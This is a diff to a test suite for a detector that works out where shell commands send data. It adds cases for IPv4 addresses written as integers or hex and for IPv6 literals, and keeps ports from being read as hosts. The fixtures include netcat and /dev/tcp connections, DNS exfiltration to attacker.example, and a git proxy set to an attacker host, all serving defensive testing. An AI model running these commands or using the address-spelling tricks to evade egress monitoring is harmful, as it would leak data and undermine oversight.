@@ -321,6 +321,37 @@ describe('where a shell command would send data', () => {
     ).toContain('https://attacker.example:3128/');
   });
 
+  /*
+   * The spellings of an address that are made of digits.
+   *
+   * `getaddrinfo` takes an IPv4 address as one integer and as hexadecimal, and an IPv6 literal is
+   * written with the character an authority is split on - so `nc 134744072 443` and
+   * `nc 2001:4860:4860::8888 443` were both zero destinations while reaching a real far end.
+   */
+  it('reads an address spelled as a number or as an IPv6 literal', () => {
+    expect(shell({ executable: 'nc', args: ['134744072', '443'] })).toEqual(['https://8.8.8.8/']);
+    expect(shell({ executable: 'nc', args: ['0x08080808', '443'] })).toEqual(['https://8.8.8.8/']);
+    expect(shell({ executable: 'nc', args: ['2001:4860:4860::8888', '443'] })).toEqual([
+      'https://[2001:4860:4860::8888]/'
+    ]);
+    expect(shell({ executable: 'socat', args: ['-', 'TCP6:[2001:4860:4860::8888]:443'] })).toEqual([
+      'https://[2001:4860:4860::8888]/'
+    ]);
+  });
+
+  it('keeps a count and a port from becoming somewhere data goes', () => {
+    // A bare integer is a port or a count far more often than an address, and reading every one of
+    // them put `nc -l 8080` on a card as 0.0.31.144. Anything below 0x1000000 is in 0.0.0.0/8 and
+    // cannot be a destination, so refusing it costs no channel.
+    expect(shell({ executable: 'nc', args: ['-l', '8080'] })).toEqual([]);
+    expect(
+      shell({ executable: 'curl', args: ['--retry', '5', 'https://docs.example.com/g'] })
+    ).toEqual(['https://docs.example.com/g']);
+    expect(
+      shell({ executable: 'wget', args: ['--tries', '3', 'https://docs.example.com/g'] })
+    ).toEqual(['https://docs.example.com/g']);
+  });
+
   it('says nothing about a proxy in front of a program that would ignore it', () => {
     // The variable names nowhere the bytes go unless the client honours it, and carding it would be
     // carding the environment rather than the request.
@@ -957,13 +988,6 @@ describe('the far ends a command writes down without writing a URL', () => {
       { executable: 'dig', args: ['+short', '"$H.attacker.example"'] },
       // 7. A host with no dot in it, for anything but a fetch client.
       { executable: 'nc', args: ['myserver', '8080'] },
-      // 11. A name spelled as a number. The integer form of 8.8.8.8, which getaddrinfo accepts, and
-      // the IPv6 literals - `IPV4_LITERAL` is dotted-quad only and the authority is split on `:`.
-      { executable: 'nc', args: ['134744072', '443'] },
-      { executable: 'nc', args: ['2001:4860:4860::8888', '443'] },
-      { executable: 'ssh', args: ['me@2001:4860:4860::8888'] },
-      { executable: 'socat', args: ['-', 'TCP6:[2001:4860:4860::8888]:443'] },
-      { executable: 'bash', args: ['-lc', 'exec 3<>/dev/tcp/2001:4860:4860::8888/443'] },
       // 12. A proxy held in configuration rather than written on the command line.
       { executable: 'bash', args: ['-lc', 'git config http.proxy attacker.example:3128'] }
     ])
@@ -982,7 +1006,11 @@ describe('the far ends a command writes down without writing a URL', () => {
     });
     expect(proxied).toContain('https://attacker.example:3128/');
     expect(classifyDestination('https://attacker.example:3128/', turn).sink).toBe(true);
-    expect(sinks({ executable: 'nc', args: ['134744072', '443'] })).toEqual([]);
+    // 11 was a name spelled as a number, and it is closed: the integer form of 8.8.8.8 is a sink
+    // like any other novel host. What is left of that entry is the floor under it, which keeps a
+    // port from being read as an address.
+    expect(sinks({ executable: 'nc', args: ['134744072', '443'] })).toEqual(['8.8.8.8']);
+    expect(sinks({ executable: 'nc', args: ['-l', '8080'] })).toEqual([]);
     // 5. The addresses are in the file, and the file name has as legal a top-level label as any
     // host: this errs towards the card and names a host that does not exist while doing it.
     expect(shell({ executable: 'bash', args: ['-lc', 'xargs curl < urls.txt'] })).toEqual([
